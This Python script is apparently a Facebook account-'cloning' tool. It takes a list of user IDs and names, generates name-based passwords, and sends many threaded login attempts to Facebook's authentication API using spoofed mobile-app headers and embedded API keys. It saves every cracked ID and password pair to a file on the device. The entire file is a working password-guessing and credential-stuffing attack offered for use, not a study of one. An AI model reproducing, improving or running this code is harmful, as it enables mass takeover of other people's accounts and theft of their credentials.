#!/usr/bin/python
#CythonFamily+++()

import os, requests, re, random, datetime, sys, time, uuid, base64, subprocess, zlib
from concurrent.futures import ThreadPoolExecutor as CHI
import base64
import marshal
from os import system as sis
from rich.markdown import Markdown as mark
from platform import platform
from bs4 import BeautifulSoup as par
ses=requests.Session()
oks = []
cps = []
id = []
ps = []
lisensikuni=[]
lisensiku=[]
sid = []
total=[]
loop = 0
id=[]
id2=[]
loop=0
ok=0
cp=0
method=[]
uid=[]
ua=[]
ses=requests.Session()
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
C='\033[0m' #CLEAR
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
Z = "\033[1;30m" # Hitam
# Converter Bulan
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
tpc = 'TAP-A2F-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
Z = '\033[1;33m'
B = '\33[1;96m'

def hapus():
    try:os.remove(".cok.txt");os.remove(".tok.txt")
    except:pass
    
def clear():
    if "win" in sys.platform:os.system("cls")
    else:os.system("clear")
    
def clear():
        os.system('clear')
def banner():
        os.system('clear')
        print("""%s
                   
, ＜￣｀ヽ、　　　　　　／￣＞
　ゝ、　　＼　／⌒ヽ,ノ 　/´
　　　ゝ、　`（ ( ͡° ͜ʖ ͡°) ／
　　 　　>　 　 　,)
　　　　　∠_,,,/ 

                             CODE BY  : CHIGOZIEWORLDWIDE 
                             Telegram : CythonFamily
                             Github   : https://t.me/CHIG0ZIEWORLDWIDE
                             Team     : Cython-Family
                             Version  : J50.0
 ╔╦══• •✠•❀ XFORD ❀•✠ • •══╦╗
 ╚╩══• •✠•❀ XFORD ❀•✠ • •══╩╝
 
---------------------------------------------------------------------
 🎀  Don't Minimize When Clonning
---------------------------------------------------------------------

"""%(P))

def Main_():
    clear()
    banner()
    print(70*'-')
    print('%s[%s+%s] %sSTATUS %s: %sPREMIUM'%(P,P,P,P,P,H))
    print(f"{S}[+] DATE   : {tgl} {bln} {thn}{S}")
    print(70*'-')
    print('%s[%s01%s] %sFILE CLONE'%(P,P,P,P));time.sleep(0)
    print('%s[%s00%s] %sEXIT%s'%(P,P,P,M,N));time.sleep(1)
    jh = input(P+'['+P+'++'+P+'] MENU  ')
    if jh in ['1','01']:xcrack().xrack()
    elif jh in ['0','00']:hapus();exit("[++] Exit Successfully")
    else:exit('[+] RETURN BACK TO MENU')

class xcrack():

    def __init__(self):
        self.id=[]      

    def xrack(self):
        clear()
        banner()
        file = input('[+] ENTER FILE NAME ')
        try:
            self.id = open(file, "r").read().splitlines()
            self.pasw()
        except FileNotFoundError:
            exit()

    def methodCHI(self, sid, name, psw):
        try:
            global oks,loop
            sys.stdout.write(f"\r {loop}|{len(self.id)} [{R}{len(oks)}{S}]")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(22,88))+'.0.0.'+str(random.randrange(3,58))+str(random.randint(22,88)) +";FBBV/"+str(random.randint(2222223,8888888))+";[FBAN/FB4A;FBAV/196.0.0.61;FBBV/787895399;FBDM/{density=1.5,width=720,height=1280};FBLC/en_US;FBRV/387109426;FBCR/Personal;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2483;FBSV/14.0;FBCA/armeabi-v7a:armeabi;]"
            try:
                ls = name.split(' ')[1]
            except:
                ls = fs    
            for pw in psw:
                ps = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',name).replace('name',name.lower())
                with requests.Session() as session:
                    data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email": sid,"password": ps,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                    headers = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                url = "https://b-graph.facebook.com/auth/login?include_headers=false&decode_body_json=false&streamable_json_response=true"
                q = ses.post(url,data=data, headers=headers, allow_redirects=False,verify=True).json()
                if 'session_key' in q:
                    datr = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    #cokz = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                    #coki = (f"datr={datr};{cokz};m_pixel_ratio=1.25;dpr=1.25;wd=448x931;")
                    print(f'\r {H}[OK] {sid} | {ps}')
                    oks.append(sid)
                    open('/sdcard/CHIGOZIEOK.txt','a').write(f"{sid} | {ps}\n")
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    print(f'\r\033[1;31m [CP] {sid} | {ps}')
                    cps.append(sid)
                    open('/sdcard/CHIGOZIECP.txt','a').write(f"{sid} | {ps}\n")
                    
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
            self.methodCHI(sid, name, ps)

    def pasw(self):
        os.system("clear")
        banner()
        print(70*'-')
        print('[1] METHOD API')
        print(70*'-')
        psw = input('CHOOSE: ')
        if psw =='1':
            os.system("clear")
            pw = []
            banner()
            print('[+] Put limit between 1 to 20')
            sl = int(input('[+] How many password do you want to add? '))
            os.system("clear")
            banner()
            print(f'{S}[Exp:first123,last123,firstlast,etc]')
            print('')
            if sl =='':
                print('\n[+] Put limit between 1 to 20')
            elif sl > 50:
                print('\n[+] Password limit Should Not Be Greater Than 20')
            else:
                for sr in range(sl):
                    pw.append(input(f'[+] Password {sr+1}: '))
            os.system("clear")
            banner()
            print(70*'-')
            print(f"[+] DATE  :  {tgl} {bln} {thn}")
            print(70*'-')
            print('\033[1;97m[+] TOTAL IDS = \033[92;1m '+str(len(self.id)))
            print("\033[1;97m[+] CLONING HAS STARTED\x1b[0m")
            print("\033[1;97m[+] PROCESSING\x1b[0m")
            print(70*'-')
            with CHI(max_workers=30) as world:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                       else:
                            pwx =  pw
                       world.submit(self.methodCHI, uid, name, pwx)
                   except:pass          
        
        
        
if __name__=='__main__':
    sis('git pull')
    Main_()